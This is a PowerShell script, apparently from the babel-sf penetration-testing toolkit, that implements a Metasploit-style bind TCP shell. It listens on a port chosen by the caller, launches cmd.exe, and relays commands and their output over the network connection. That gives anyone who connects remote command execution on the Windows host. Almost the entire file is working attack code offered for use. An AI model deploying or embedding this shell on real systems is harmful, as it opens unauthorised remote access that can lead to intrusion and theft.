#########################################################
# 
# msf-bind_tcp-powershell.ps1 version 0.1
#
# babel-sf ( https://github.com/attackdebris/babel-sf )
#
#########################################################
#
# Original Code:
# PowerShell Bind by Josh Kelley (winfang) and Dave Kennedy (ReL1K)
# Defcon Release

param (
[Parameter()]
[string]$port_number
)

if ($port_number -eq "")
{
echo "msf-bind_tcp-powershell.ps1 - ( https://github.com/attackdebris/babel-sf )"
echo "`nUsage:"
echo ".\msf-bind_tcp-powershell.ps1 [port number]"
echo "e.g. .\msf-bind_tcp-powershell.ps1 80`n"
exit
}

$encoding = new-object System.Text.AsciiEncoding
$endpoint = new-object System.Net.IpEndpoint ([System.Net.Ipaddress]::any, "$port_number")
$listener = new-object System.Net.Sockets.TcpListener $endpoint
$listener.start()
echo "Starting msf-bind_tcp-powershell.ps1 ( https://github.com/attackdebris/babel-sf )`n"
echo "Listening on port $port_number..."
$socket = $listener.AcceptTcpClient()
$networkstream = $socket.GetStream()
$networkbuffer = New-Object System.Byte[] $socket.ReceiveBufferSize
$process = New-Object System.Diagnostics.Process 
$process.StartInfo.FileName = "C:\\windows\\system32\\cmd.exe"
$process.StartInfo.RedirectStandardInput = 1
$process.StartInfo.RedirectStandardOutput = 1
$process.StartInfo.UseShellExecute = 0
$process.Start()
$inputstream = $process.StandardInput
$outputstream = $process.StandardOutput
 
Start-Sleep 1
 
while($outputstream.Peek() -ne -1){
    $string += $encoding.GetString($outputstream.Read())
}
$networkstream.Write($encoding.GetBytes($string),0,$string.Length)
$string = '' 
$done = $false
while (-not $done) {
    $pos = 0
    $i = 1
    while (($i -gt 0) -and ($pos -lt $networkbuffer.Length)) {
                    $read = $networkstream.Read($networkbuffer,$pos,$networkbuffer.Length - $pos)
        $pos+=$read
        if ($pos -and ($networkbuffer[0..$($pos-1)] -contains 10)) {
            break
        }
    }
    if ($pos -gt 0) {
        $string = $encoding.GetString($networkbuffer,0,$pos)
        $inputstream.write($string)
        
        # Write Output
        $out = $encoding.GetString($outputstream.Read())
        while($outputstream.Peek() -ne -1){
            $out += $encoding.GetString($outputstream.Read())
        }
        $networkstream.Write($encoding.GetBytes($out),0,$out.length)
        $out = $null
    }
    else {
        $done = $true
    }
}          